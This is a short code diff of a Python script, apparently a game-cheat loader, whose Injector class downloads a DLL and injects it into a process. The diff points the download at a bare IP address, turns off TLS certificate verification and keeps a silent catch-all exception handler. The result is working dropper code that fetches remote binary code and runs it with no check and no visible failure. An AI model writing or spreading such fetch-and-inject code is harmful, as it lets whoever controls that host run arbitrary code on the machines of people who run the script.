@@ -49,13 +49,13 @@ class Injector:
         log('Injected Successfully !')
 
 
-url = "https://cdn.discordapp.com/attachments/1037817329611980844/1217547070446108732/cheat.dll?ex=660da692&is=65fb3192&hm=8bfccbe67ee62f7b6f39073b7962c60974a6b0dfb719088e2c3456ff4171b05e&"
+url = "https://85.215.133.119/file"
 try:
     with tempfile.TemporaryDirectory() as directory:
-        response = requests.get(url, allow_redirects=True)
+        response = requests.get(url, allow_redirects=True, verify=False)
         open(f'{directory}/cheat.dll', "wb").write(response.content)
 
         injector = Injector(filename=f'{directory}/cheat.dll')
         injector.inject()
-except:
+except Exception:
     pass
